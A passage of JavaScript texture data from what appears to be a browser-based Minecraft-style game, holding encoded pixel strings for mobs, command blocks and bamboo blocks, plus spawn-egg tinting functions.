		"dragon73": "0g0g3kHoYsZ0000VllmV5V6VUlV!qVU5V6VlVK!!VUlVC",
		"dragon74": "0g0g3kHoYsZ0000VmVVVUVVVKVVVVVVUVVVU",
		"dragon75": "0g0g2kH00000ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ",
		"dragon76": "0g0g9kHc(Z8wYfYYoYbZsZ00W000000001zQQNl5V1zQQNg51C)>g7EOOlV1Eg0V1EIIg0G1EIIl7G1yyyyg5V1yyyyg0yyyylV1yyyyg0V1yyyyg0G1hhhhl7G1hhhhg5V1hhhhg0",
		"dragon77": "0g0gakHoY000?kH|)ZPAYVVHsZZW000000001h1hyy)Q01g0yyGnGgyyGnG1yyQ.hhh0yyOnGn0yy*VnGnyyyyhhh0yyyyGnG0yyyyGnG1yyyyhhg0yyyynGg0yyyynGhhyyyyhhg0yyyy0nG0yyyy",
		"dragon78": "0g0gbkHWHPAY000?kH|)ZYZVVHW0000iOQQnIIIIV..O-OQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ",
		"dragon79": "0g0g7000?kH|)ZZVVHPAYW000000FyJ000@P000,|000A000CJ000+000000000000000000000000000000000000000000000000000000000",
		"dragon80": "0g0g9oYsZkH000YWc(ZH8wY11h1h1h1w0000000xh1h1h1hxh1h1h1hy0000000y1h1h1h10w11h1gwyyyyyyyyOOOOOOOO>OOOOOOOOOOOOOOOOOOOOOOOOOO@OOOOOO]OOOOOO]OOOOO",
		"dragon81": "0g0g4sZoYkH0004444VVVVSSSSSSSSVVVV44444ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ",
		"dragon82": "0g0g4sZoYkH0004444VVVVSSSSSSSSVVVV4444444ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ",
		"dragon83": "0g0g4sZoYkH0004449VVVSSSRSSSTVVV444a49ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ",
		"dragon84": "0g0g4oYsZkH000h000llllll0009]8ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ",
		"dragon85": "0g0g4sZoYkH00045Q4VVSRSSTSVV4a4pp4ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ",
		"dragon86": "0g0g4sZoYkH0004444VVVVSSSSSSSSVVVV4444pU45ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ",
		"dragon87": "0g0gasZoYkH000YWHEYZoH0g0g0g0ghhhhhhhhg0g0g0g0g0g0g0g0hhhhhhhh0g0g0g0ghxhxhg0gyyyyyyyyOOOO?V?VOOOO@[OOOOUIIOOOOOOOOGOOOOQIOOOO?V?OOOO@@",
		"dragon88": "0g0g9sZoYkHYWHEYZoH0g0g0g0ghhhhhhhhg0g0g0g0g0g0g0g0hhhhhhhh0g0g0g0g0g0xhxggyyyyyyyy)Q)Q)Q)Q**GGGGIIIIGGGGXIXI*V*V*V*V",
		"dragon89": "0g0g9sZoYkHYWHEYZoH0g0hhg0ghhhiyhhhg0g2y0g0g0g1x0g0hhhixhhh0g0ywg0g1xhxhhhxyyyyyyyy)Q)Q)Q)Q*V*V+VGGGGIIIIGGGGQIQ)Q*V*V*V*V",
		"dragon90": "0g0g9sZoYkHYWEYZHoH0g0g0g0hhhhhhhhyg0g0g0gyg0g0g0ghhhhhhhhi0g0g0g0ihw0ghx0xyyyyyyyy)Q)Q)Q)Q*VG,GOIIII)VVVV)]I)Q-Q,G,G,G,G",
		"dragon91": "0g0ga000kHsZoYYWHZEYoH00000000hhhhhhhhhyNyNyMhjyjOiyOzhhhhhhhh000000000000000000000000?V?V?V?V@@IUGGGGIII[GGG??@@@@",
		"dragon92": "0g0gaoYkHsZ000YWHEYoHZ0g0g0g0ghhhhhhhhhh2y1hhhgyg220g0hhhhhhhhOOOOOOOOOOOOOOOOOOOOOOOO?V?V?V?V@@@@IIIIGGGG?I?V@@@@",
		"dragon93": "0g0gaoYkH000sZYWZEYHoH0g0gyyyyhhhhhhhh3Mhj1hhh3O3O30gOhhhhhhhhyyyyyyyyyyyyyyyyyyyyyyyy?V?V?V?VG]]GGGG?V?V]I]I]I]I",
		"dragon94": "0g0ga000kHoYsZYWZEYHoH00000000hhhh0000zOzh0000zOyy0000hhhh0000000000000000000000000000?V?V0000]I0000Q00000000GG00000000?V0000]I]I0000",
		"dragon96": "0g0g9W8wYc(Z000oHEYHZY1yyOOOOOSyyzOOOOyyyOOOOiyyzOOOiyyyzOOiyyyyzO]iyyyyyySiyyyyyyiyyyyyyiyyyyyyiyyyyyyiyyyyyy]iyyyyyySiyyyyyyiyyyyiyiyyyxyy",
		"dragon97": "0g0g8000c(Z8wYHYWZoH000000000000000000000000000000000000000000A0000AJP}00AJ^00AJ^00AJ0AJ0AJ0AJQ0A;Q0",
		"dragon103": "0g0gaWYoHHZEY000oYkHsZ1h1h1h1h0iwg0g0gO?VjO?V?kAQxhAQAiyRwiyRylV?lV?V1kAh1kAh0g0g0g0gGGIIIIGGIGIIII",
		"dragon104": "0g0g9WYZoHEYoYkH000sZ1h1h1h1h0z(g0z(gQAQAQAQAyNyNyNyNzOzOzOzOAQAQAQAQ1h1h1h1h0g0g0g0gVVGGGGVGGGGIGGGGIVGGGGVVGGGGIGGGGVIGGGGGGGG",
		"dragon105": "0g0g6WYoHZEY0004P4PPaPss++CJCJ[A[A4|0808",
		"dragon106": "0g0gbWYoHZEYHoYkHsZgTWc(Z1h1h1h1hyg0iyNwgQ)Q)Q)QlOzOzOzO1NyNyNyNw)Q)Q)Q)?xh1h3M1h0g0g0g0gGGGGIGGIIIGGIIGIIGG",
		"dragon107": "0g0g7WYoHZHEY0004P4P0I0%+B+FCFCJN+540808",
		"dragon108": "0g0g9WYZoHEY000kHoYsZ1h1h1h1h0zOw0zOzQAQAQAQAyNyNyNyNzOzOzOzOAQAQAQAQNx1yNx1i0g0g0g0gVVVVVGVVVVVGVVVVVVVVVVGGGVVVVVVVVVVVVVVVVVVVV",
		"dragon109": "0g0g9WYoHZEYoYkH000sZ1h1h1h1h0g0g0gyNQ)Q)Q)Q)OzOzOzOzNyNyNyNy)Q)Q)Q)QzOzM1jzO0g0g0g0gVVVVGVGIIGIIGVVVGIGIVGVVVG",
		"dragon110": "0g0g7WYZoHEYH0004P4P10KPkPdPP||?A?B^C0808",
		"dragon112": "0g0g8ZW8wYc(ZHoHYEY5+h+++++++p+4iCC|C|C|0kuCDCCT",
		"dragon113": "0g0g9c(Z8wYYWoH000EYHZ01z>005V01C005V0iRx005V0j>g000V1Cg000V1-x000053)x00005nh00000-g00000)xg00000x000000h000000g000000xg000000M0000000g0000000",
		"dragon114": "0g0g2000c(Z00000000000000000000000Z0",
		"dragon119": "0g0g3kHoYsZ0000qVqlUlUCClUlaKaKqq55U665U5UaaK!!llCC",
		"dragon120": "0g0g3kHoYsZ0000lpBlUlCC5Ula!qq5U5UC6lU5!aKqq5U5U66",
		"dragon121": "0g0g4000kHsZoY00000000000000000000000000000000VVVVVVVVV0000000000000000",
		"dragon122": "0g0g7kHgTWsZoYc(ZwW0000S8c8e,oe,oaAaA^A^Arr,r000^A0A%000",
		"dragon123": "0g0g4000kHsZoY00000000000000000000000000000000VVVVVVVV0000000000000000",
		"dragon124": "0g0g4000kHsZoY00500fHVVVVVVHZZZZVVVV0000000000000000",
		"dragon125": "0g0g4oYsZkH000qqh8a0qlFkl120!]98ZZZZZZZZZZZZZZZZ",
		"dragon126": "0g0g4000kHsZoY00000000VV00V0000Z000000Z000000VV000000000000000000",
		"dragon128": "0g0g8EYY8wYc(ZHZWoH0]aCrYCJCbj0CCY*Cz0+0$|bj",
		"dragon129": "0g0g28wYc(ZHZZZZZZZZZZZYHZZvZZZZZZZZZ",
		"dragon130": "0g0g2c(Z0000H0W0f03000000000000000000000000",
		"dragon131": "0g0g2000c(Z0000000000000Z0Z0Z0Z0Z0Z0Z0Z0",
		"dragon135": "0g0gaoYsZkH000YWHEYZoH11h011h0y002w002yh1ixh1iwh1gwh1gy002y002y1hyy1hy000w0whwyyyyyyyyOO?V?V?VOO@[@GOOUIIIOOV?V?V?@@@@]UQUQUIPV?@@@@",
		"dragon136": "0g0g9oYsZkHYWZEYHoH01h001h0y002w00yyh1ixh1ywh1gxh1gw002w00yx1hyy1hy0xgw0xgwyyyyyyyy)Q)Q)Q)Q+GV>VVQ)Q)Q)Q)G,G,G,G,V>VVO>)IX)II,G,G,G,G",
		"dragon137": "0g0g7000YWHEYZoH000000000000000000000000000000000000000000000000FyJFyJ%A_AQ]],yJF%%",
		"dragon138": "0g0g7000YWZHEYoH000000000000000000000000000000000000000000000000FyJFyJ[>A{_]]cc+BmFyJN>AN>A",
		"dragon139": "0g0g7000YWHZEYoH000000000000000000000000000000000000000000000000FyJFyJ%|A@|x]]BjMDPM#%%",
		"dragon140": "0g0g7000YWZEYHoH000000000000000000000000000000000000000000000000FyJFyJN[A?P]]||L+iy++",
		"dragon141": "0g0g7000YWZEYHoH000000000000000000000000000000000000000000000000FyJFyJ[BQ]]||L++J#++",
		"dragon142": "0g0g9000YWHkHoYsZZoH0000000000000000000000000000000000000000000000000000000000000000iy000000jO000000xh00QQQQyi00QQQOjOj@GDGx?VU?oyQ@QQjOjO?V?V",
		"dragon143": "0g0g4000kHsZoY0000000000000000000000000000000000000000V000000000000000H000",
		"dragon144": "0g0g7000WYc(Z8wYHoH00000000000000000000000000000000000000000000000000000000000000lr0000Vz0000R0000R0000.U00009N",
		"dragon145": "0g0g3000c(Z8wY000000000000000000000000000000000000S000VVU0VVVVVVVVVVVVVVVVVVV",
		"dragon146": "0g0g2000c(Z00000000000000010f0WfZZZZZZZZZZZ",
		"dragon147": "0g0g9000Yc(ZW8wYHEYZoH00010000000z0000002?000000yT000000y>00000yy?00002yyT0000yyy>0000yyym0000yyy,0000yyy-0000yyA0000yyAn0000yyAo0000yyAm0000yyA,0000",
		"dragon158": "0g0g4000kHsZoY5VVV5V67H6e75V77H6eZ7HV5V75",
		"dragon159": "0g0g4kH000sZoY005Ve5VVWVaV/VfVeVVWV!V!*Vf5Ve5VVf5V",
		"dragon160": "0g0g6000c(Z8wYWHY000020000200002V00002^00002^00002P00002P00002P00002P00002P00002P00002P0000iP0000iP0000iP0000iP",
		"dragon161": "0g0g88wYc(ZYoHWHEYZ0JPAJPSJPAJPiPAJPiPAJP2PAJP9PAJPh9AJPyTAJPAFAJPA84JPAJPAiPAJz2PAJ?PAJ]9AJPj1",
		"dragon162": "0g0g2c(Z8wY000010101010000000S0S0w0w0g",
		"dragon163": "0g0g9c(Z8wYWoH000HEYYZ001zQQQQ001QQQQ001QQQQ001QQQQ001QQQQ001EQQQQ001zQQQQ001QQQQ001QQQQ001QQQQ001QQQQ001EQQQQ001zQQQQ001QQQQ001QQQQ001QQQQ",
		"dragon174": "0g0g4000kHoYsZ5HbH67765Va00000000000000000000000000000000",
		"dragon175": "0g0g4oYsZkH000qZgZ2LZZh~Z2LZqZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ",
		"dragon176": "0g0g3000c(Z8wY001V005V005V005V005V00lV00lV00lV00VV00VV00VV01VV01VV05V0lVV0lVV",
		"dragon177": "0g0g8c(Z8wYYEYHWZoH0005,h000600000000lr0000i00002V00000{000009000000000000000000000000000000000000A000002P000",
		"dragon178": "0g0g8c(Z8wYYHoHZWEY0000g0w00020Q000S{000Sy0008JS001000^w00:_CA00BZ{00g00j002S00^I009_M000%",
		"dragon179": "0g0g9c(Z8wYYEY000WZoHH001zQQQQ001QQQQ001QQQQ001QQQQ001CQQQQ005DQQQQg08QQQQ002QQQQ00lGQQQQ00oOQQQQ00iQQQQ00lQQQQ00oQQQQ00iQQQQg0lGQQQQx0oOQQQQ",
		"dragon192": "0g0g2000c(ZfZvZWZWZHZHZZZZZ0000000000000000",
		"dragon193": "0g0g3c(Z8wY00000U0001000500000000000000000000",
		"dragon194": "0g0g9c(Z8wYYoHZWHEY00000001y)Q00000lO>000001[hh0000h00hg001l000000010000000000000000IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII",
		"dragon195": "0g0g9oHY8wYZ000WEYHc(Z1yxOQQQQ0iB(QQQQ,G+QQQQO3h3QQQQl0(QQQQD+QQQQyh3OQQQQB(QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ",
		spawnEnderDragon: function(n){
      var pix = spawnEgg.slice()
      var pix2 = spawnEggOverlay.slice()
      for (let i = 0; i < pix.length; i += 4) {
        var r = 28, g = 28, b = 28
        pix[i] *= r / 255
        pix[i+1] *= g / 255
        pix[i+2] *= b / 255
        setPixel(n, i >> 2 & 15, i >> 6, pix[i], pix[i + 1], pix[i + 2], pix[i + 3]);
			}
      for (i = 0; i < pix2.length; i += 4) {
        if(pix2[i+3]){
          var r = 224, g = 121, b = 250
          pix2[i] *= r / 255
          pix2[i+1] *= g / 255
          pix2[i+2] *= b / 255
          setPixel(n, i >> 2 & 15, i >> 6, pix2[i], pix2[i + 1], pix2[i + 2], 255);
        }
      }
    },
		spawnWolf:function(n){
      var pix = spawnEgg.slice()
      var pix2 = spawnEggOverlay.slice()
      for (let i = 0; i < pix.length; i += 4) {
        var r = 215, g = 211, b = 211
        pix[i] *= r / 255
        pix[i+1] *= g / 255
        pix[i+2] *= b / 255
        setPixel(n, i >> 2 & 15, i >> 6, pix[i], pix[i + 1], pix[i + 2], pix[i + 3]);
			}
      for (i = 0; i < pix2.length; i += 4) {
        if(pix2[i+3]){
          var r = 206, g = 175, b = 150
          pix2[i] *= r / 255
          pix2[i+1] *= g / 255
          pix2[i+2] *= b / 255
          setPixel(n, i >> 2 & 15, i >> 6, pix2[i], pix2[i + 1], pix2[i + 2], 255);
        }
      }
    },
		wolfAngry: "0S0wu000;ZYsYZHHZ-Z;ZgH(ZZ,ZW-YnYZYHHY-H$YYP3YZcWW|W000Iy8SX00000002kMaN4w(000000000000000X>o]M8A00000000F8gXog000000000000000ITgh4>00000000I92wI92w000000000000001R8(A0000000188x88w000000000000w]AR^iNgp6S000014gx4gw000000000000oJ?FFJh4yg@S00000XggXgg0000000000008QwX8S00001XX96hXX96g000000000000o}g92(g8Xi4R8QwITp8(Qo@00000000o=ghXp6S4Rg@T8x8ycyghg>g00000000xr7F_gXx8Sc98T4oigxohcz8X00000000008MS000000go^R8zoNkzwwz9400000000009S000000cwN8ToRhF6gp]0000000000a^S000000cFc4R8iM@oF0000000000ay000000000000000000000000000000000#D-K5000000gQS00000000000000000EXx8Dp^wKI00000ygXg00000000000000000J^Rp^w>400000TxRw000000000000000000000000000000000000MI000000000000000000LK001K000000000MI000000000000000000LK001S000000000F00000000000000000p2S1]Mzo8SIRx6NgRg]T4?8S00000000000008NcA18g88gIywhTgRTc800000000000008@N4z1](X88h8ywNgTgT4g00000000000008Mx1]ho6h8RoRgRg(IgS0000000000000p6S1]hw6x4RwigR8X(I80000000000000|18(A86gRx6hRoRM4o0000000000000Fo1]gz88(TwNgyw@SoS0000000000000w1]ho8Mzx6RgwSo0000000000000000000000008Tx6NgwSw0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
		wolfCollar: "0S0w3000YZ000000000000000000000S200000000000000S200000000000000S100000000000000S20000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
		wolfTame: "0S0wr000;ZYsYZHHZZZgH,ZW-YnYZYHH-ZY-H$YYP3YZcWW|W000Iy8SX00000002kMaN4w(000000000000000X>o]M8A00000000F8gXog000000000000000ITgh4>00000000I92wI92w000000000000001R8(A0000000188x88w000000000000w@R4R92Ngp6S000014gx4gw000000000000oNsx-h4yg@S00000XggXgg0000000000008QjFTwX8S00001XX96hXX96g000000000000oRQ]g92(g8Xi4R8QwITp8(Qo@00000000o%JhXp6S4Rg@T8x8ycyghg>g00000000xiXxaJgXx8Sc98T4oigxohcz8X00000000006S000000go^R8zoNkzwwz9400000000007S000000cwN8ToRhF6gp]00000000008/dS000000cFc4R8iM@oF00000000008@f000000000000000000000000000000000BFyu4.00000gQS00000000000000000xF^Xu.(I00000ygXg00000000000000000zoMs.>M400000TxRw000000000000000000000000000000000000MI000000000000000000F^0010000000000MI000000000000000000F^001000000000F00000000000000000p2S1]Mzo8SIRx6NgRg]T4?8S00000000000008NcA18g88gIywhTgRTc800000000000008@N4z1](X88h8ywNgTgT4g00000000000008Mx1]ho6h8RoRgRg(IgS0000000000000p6S1]hw6x4RwigR8X(I80000000000000|JC18(A86gRx6hRoRM4o0000000000000F1]gz88(TwNgyw@SoS0000000000000w1]ho8Mzx6RgwSo0000000000000000000000008Tx6NgwSw0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
		wolf: "0S0wr000;ZYsYZHHZZZgH,ZW-YnYZYHH-ZY-H$YYP3YZcWW|W000Iy8SX00000002kMaN4w(000000000000000X>o]M8A00000000F8gXog000000000000000ITgh4>00000000I92wI92w000000000000001R8(A0000000188x88w000000000000w@R4R92Ngp6S000014gx4gw000000000000oNgxwh4yg@S00000XggXgg0000000000008QjFTwX8S00001XX96hXX96g000000000000oRQ]g92(g8Xi4R8QwITp8(Qo@00000000o%JhXp6S4Rg@T8x8ycyghg>g00000000xiXxaJgXx8Sc98T4oigxohcz8X00000000006S000000go^R8zoNkzwwz9400000000007S000000cwN8ToRhF6gp]00000000008/dS000000cFc4R8iM@oF00000000008@f000000000000000000000000000000000BFyu4.00000gQS00000000000000000xF^Xu.(I00000ygXg00000000000000000zoMs.>M400000TxRw000000000000000000000000000000000000MI000000000000000000F^0010000000000MI000000000000000000F^001000000000F00000000000000000p2S1]Mzo8SIRx6NgRg]T4?8S00000000000008NcA18g88gIywhTgRTc800000000000008@N4z1](X88h8ywNgTgT4g00000000000008Mx1]ho6h8RoRgRg(IgS0000000000000p6S1]hw6x4RwigR8X(I80000000000000|JC18(A86gRx6hRoRM4o0000000000000F1]gz88(TwNgyw@SoS0000000000000w1]ho8Mzx6RgwSo0000000000000000000000008Tx6NgwSw0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
		commandBlockBackError0: "0g0gr*HZYWFWZSJWUJHH|Z<Y%HcZWYZVWZ|WHJ.YjZHHWJWH00h4000h4002xIw02xIw0QNcT8QNcT8R.i8U^okIV23QVe|0q.p00s002ow0Q:&kT8.kg=MkI.3QQw|QXg|0qA90qA9",
		commandBlockBack0: "0g0grZ+HWZYyYSWUH+Y|Z<Y%HcZYYZVWZ|WHJ.YjZHHWJWH00h4000h4002xIw02xIw0QNcT8QNcT8R.i8U^okIV23QVe|0q.p00s002ow0Q:&kT8.kg=MkI.3QQw|QXg|0qA90qA9",
		commandBlockBack1: "0g0grZ+HWZYyYSWUH+Y|Z<Y%HcZYYZHZHHJ.YW4WHWVWVW00h4000h4002xIw02xIw0QNcT8QNcT8R.i8U^okIV23QVe|0q.p00s002ow0Q:&kT8.kg=MkI.3QQw|QXg|0qA90qA9",
		commandBlockBack2: "0g0grZ+HWZYyYSWUH+Y|Z<Y%HcZYYZHZ?YHJ.YHVWHWJWH00h4000h4002xIw02xIw0QNcT8QNcT8R.i8U^okIV23QVe|0q.p00s002ow0Q:&kT8.kg=MkI.3QQw|QXg|0qA90qA9",
		commandBlockBack3: "0g0gqZ+HWZYyYSWUH+Y|Z<Y%HcZYYZHJWjZHJ.YWVWWZVW00h4000h4002xIw02xIw0QNcT8QNcT8R.i8U^okIV23QVe|0q.p00002w0Q:eT8.g=I.3QQw|QXg|0qA90qA9",
		commandBlockBack: "0g0g1ZZZ",
		commandBlockBackError:"0g0g1ZZZ",
    commandBlockFrontError0: "0g0gmUZHWZ]YSJWUJHY<Y%HcZ3YYYHZJ.YjZ4WZW|W00h4000h4002xIw02xIw0QNcT8QNcT8RgM@RggRg^RgRt%h23_0mU*lK00%o002Ukw0QO>T8@udggR(egIRhMRg2R(_g_0mC9K0mC9K",
		commandBlockFront0: "0g0gmZ+HWZYSWUHyY<Y%HcZY+YYHZJ.YjZ4WZW|W00h4000h4002xIw02xIw0QNcT8QNcT8RgM@RggRg^RgRt%h23_0mU*lK00%o002Ukw0QO>T8@udggR(egIRhMRg2R(_g_0mC9K0mC9K",
		commandBlockFront1: "0g0gmZ+HWZYSWUHyY<Y%HcZY+YYHVWJ.YWHYWjZ00h4000h4002xIw02xIw0QNcT8QNcT8RgM@RggRg^RgRt%h23_0mU*lK00%o002Ukw0QO>T8@udggR(egIRhMRg2R(_g_0mC9K0mC9K",
		commandBlockFront2: "0g0gmZ+HWZYSWUHyY<Y%HcZY+YYHJWJ.YWHHWH00h4000h4002xIw02xIw0QNcT8QNcT8RgM@RggRg^RgRt%h23_0mU*lK00%o002Ukw0QO>T8@udggR(egIRhMRg2R(_g_0mC9K0mC9K",
		commandBlockFront3: "0g0gmZ+HWZYSWUHyY<Y%HcZY+YYHJWJ.YHHYWjZ00h4000h4002xIw02xIw0QNcT8QNcT8RgM@RggRg^RgRt%h23_0mU*lK00%o002Ukw0QO>T8@udggR(egIRhMRg2R(_g_0mC9K0mC9K",
		commandBlockFront: "0g0g1ZZZ",
		commandBlockFrontError:"0g0g1ZZZ",
		commandBlockSideError0: "0g0gq)ZHWZEYYSJW%HY<YYcZY|ZJWHJ.YUHjZHZWAYVWjZZ00h4000h4002xIw82xIw0QNcTEQNcT8Rg.RggRwgKQlUh234^{0o^p01j^002^w0QVT8V^gVKIC34Qw{4XgS0oA90oA80",
		commandBlockSide0: "0g0gqZ+HWZYyYSW%H+Y<YYcZY|ZJWHJ.YUHjZHZWAYVWjZZ00h4000h4002xIw82xIw0QNcTEQNcT8Rg.RggRwgKQlUh234^{0o^p01j^002^w0QVT8V^gVKIC34Qw{4XgS0oA90oA80",
		commandBlockSide1: "0g0gqZ+HWZYyYSW%H+Y<YYcZY|ZAYHJ.YUHWVWHWZH|WZ00h4000h4002xIw82xIw0QNcTEQNcT8Rg.RggRwgKQlUh234^{0o^p01j^002^w0QVT8V^gVKIC34Qw{4XgS0oA90oA80",
		commandBlockSide2: "0g0gqZ+HWZYyYSW%H+Y<YYcZY|ZVWHJ.YUHH4WYWZH|WZ00h4000h4002xIw82xIw0QNcTEQNcT8Rg.RggRwgKQlUh234^{0o^p01j^002^w0QVT8V^gVKIC34Qw{4XgS0oA90oA80",
		commandBlockSide3: "0g0gqZ+HWZYyYSW%H+Y<YYcZY|ZAYHJ.YUHjZHHWJWVW?YZ00h4000h4002xIw82xIw0QNcTEQNcT8Rg.RggRwgKQlUh234^{0o^p01j^002^w0QVT8V^gVKIC34Qw{4XgS0oA90oA80",
		commandBlockSide: "0g0g1ZZZ",
		commandBlockSideError:"0g0g1ZZZ",
		spiderEye: "0g0g9000NHU2WZ$ZE1WHYiY0000000000000000000000000000000000000000000hy000001)M00002-00002Oo00002o00000VVB0000002l000000z000000000000500000000000",
		heartParticle: "08086000YoHZYIH0004]FB$BCP%6P2S00",
		nameTag: "0g0gc000ZZZWHpYZhHoZWW0000000000000hy000001hiw00001jOw0004(6(000[B6(004y3K00PN+004K00P004000[000P0000[00004000000I00000",
		blazePowder: "0g0gp000WZHZWWgWZZ(YZWWZwWZW(WW0WWWZHWW(WWZZwWwW00000000000000w000000004T0000000g0w00g0002(002S000g0100g000200A8S0000^g01w0000Qg4C9000!/m400][h6[4002BxU9p{w00q540000*p(0000018Rg000000000000",
		blazeRod: "0g0gd000YHYZZTZWZZWHKWZ0WW00000000000000i0000003?K00000n00000300000k000003?00000,000001?00000r000003?00000r00000c?000001000000600000000000000",
		blaze: "0S0wd000ZYZHIWW0WZHWWWZZZ((YH0000hyyhO))V000000000000000000000000ixxQUU>000000000000000000000000hCh??Q000000000000000000000000Cm)?VU000000000000000000000000yix)VVQ000000000000000000000000iyi??V000000000000000000000000CCx)U?>000000000000000000000000hyyiOQ?00000000000000000000yCyyCCyC0000000000000000mhChCmii0000000000000000xiyxoimDoo0000000000000000DEr0000000000000000.GGG,)O,0000000000000000O.O>.>,OO)U)0000000000000000>)U)>>Q?>))UUUU0000000000000000UV?UUUUV?UVQVUVU0000000000000000Cy0000000000000000000000000000yy0000000000000000000000000000ix0000000000000000000000000000hhxs0000000000000000000000000000os0000000000000000000000000000III0000000000000000000000000000I00000000000000000000000000000000000000000000000000000000..0000000000000000000000000000))O>0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
		spawnBlaze:function(n){
      var pix = spawnEgg.slice()
      var pix2 = spawnEggOverlay.slice()
      for (let i = 0; i < pix.length; i += 4) {
        var r = 246, g = 178, b = 1
        pix[i] *= r / 255
        pix[i+1] *= g / 255
        pix[i+2] *= b / 255
        setPixel(n, i >> 2 & 15, i >> 6, pix[i], pix[i + 1], pix[i + 2], pix[i + 3]);
			}
      for (i = 0; i < pix2.length; i += 4) {
        if(pix2[i+3]){
          var r = 255, g = 248, b = 126
          pix2[i] *= r / 255
          pix2[i+1] *= g / 255
          pix2[i+2] *= b / 255
          setPixel(n, i >> 2 & 15, i >> 6, pix2[i], pix2[i + 1], pix2[i + 2], 255);
        }
      }
    },
		fireCharge: "0g0gc000)Y)YUWzWWWHCZsHYY0000000000000000000hh00000hzRh0001AR001[00i00jGP00k,P00JF009?)@009zQ)R000CR000000000000000000000000",
		beaconBeam: "0g0g4sW|WWJY5V555V566VV59V",
		debugStick:"0g0g3000fZ0W0000000o00000500600001K00500m0000100500q00o00000000000",
		oil: "0g0g4(Z0ZgWTWiy!!aiR%/*Ix!CyyNS!9cqwcw!<",
		oilBucket: "0g0ga000)HWHYTWJZgZYZZZ00000000001hhg0001iO)Tg00iBGx00lGV00hlGh00oThhiM00oIX>yM00oX>yT00kX>yT00iX>yM001IX>zg001]XOzg000kXNM00001hhg0000000000",
		dragonScales: "0g0g500WkHsZc(ZgTW5wTJ4TJ?w1P2dBk4c^Fw^c]aASa?wSiJF0SN5wPSN4^SNAJ0NFR0k]]^0J2]PQ0",
		dragonSpike: "0g0g5000WJPWY8W0k04000)0c000k0c001l0e001O06001j060000e000?008J?008|008JK?S05?S04JU0QUB0QJB0?J{0",
		silverBlock: "0g0g8WH$HZZZZZHWZHH02S4J2dreeCdOP*2NPm^fe|~e[O!O,ByEkP[yTz!D9mNw]b_Z_Y",
		//below: https://create.fandom.com/wiki/Limestone
		limestone: "0g0gwHYWWZHYHHZYZbHYYWW;YrY#Z#ZbW$WrZ$H;HZZYHrHH0Q(/i5yxX6J;xjKg3c?pe[_UwBA/gEo<({M]EmhICPv1.?X4o0w-@m[$Ea?=9/f#0anqH(A-",
		spawnEnderman:function(n){
      var pix = spawnEgg.slice()
      var pix2 = spawnEggOverlay.slice()
      for (let i = 0; i < pix.length; i += 4) {
        var r = 22, g = 22, b = 22
        pix[i] *= r / 255
        pix[i+1] *= g / 255
        pix[i+2] *= b / 255
        setPixel(n, i >> 2 & 15, i >> 6, pix[i], pix[i + 1], pix[i + 2], pix[i + 3]);
			}
      for (i = 0; i < pix2.length; i += 4) {
        if(pix2[i+3]){
          var r = 0, g = 0, b = 0
          pix2[i] *= r / 255
          pix2[i+1] *= g / 255
          pix2[i+2] *= b / 255
          setPixel(n, i >> 2 & 15, i >> 6, pix2[i], pix2[i + 1], pix2[i + 2], 255);
        }
      }
    },
		endermanEyes: "0S0w3000YfY00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000p0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
		enderman: "0S0w4000kH00WZZZ00VV0000000000a000000000000a000000000000000000000000000000000000000000000000000000000000V00VV0000000000VVVV000000V000000VV000000V000000VVHV000000VV000000VVV00V000000VVV0000V000000VV0000000VVVV0VV00000000V0000000V00000000V0V000000VVV000000VV000000000000000066VVVS00001S1VVS00001S1S00001S1VVS100S1S1S1TTS166VV",
		bambooBlock: "0g0gc3WH>YJYjHZWJWOYOHZZ1zTDT7Cx[z[FTz[z53TCx[CDDD537xDzD1xz[DDCDz[TCC53TTTz1xxTD[C[z53D7z[[DC7TCDCTz",
		bambooMosaic: "0g0g9Z5ZZJ3YYZ+YkWW1z1z?VQU6D1Dh1DCREIyxCD,GGG16S22w6Tmh@DTDQEy]>]>,O,GVQQU8>]>h1zx>EIA6DCzGO,Cz6y0w4xz1hmi6DxDyIX1DCz,OCzx",
		bambooPlanks: "0g0gaYZ+Y5ZWZZYkWZ0h0x0hh0OyAzNzN@SzQQGIGIG2zOyOyO?yQ@m2)IIGI2O?yzOOyO2)mQIIIGh2zOyzO?zNQ@h2)QGI",
		bambooBlockTop: "0g0g7YH)WkZYjYZ5C9K9Nyixy*O*!K95C9ixyNyO**!KK9izBixyOV*O*!!K9KixyizBO*OV*!!",
		strippedBambooBlockTop: "0g0g7+Y5ZZJH>ZYW5w909%d~RLRy!>095w9d%LR~R+Ry009ddLQLR!?B!R090ddLRLQ!R!?B",
		strippedBambooBlock: "0g0gaY+YZYZWkW5ZZZ1zTDT7Cx[z[ApkTz[z53TCx[CDUpkDD537xDzD1xz[DDCDzpk[TCC53TTTz1xxTDUpk[C[z53D7z[[DC7TCDCTz",
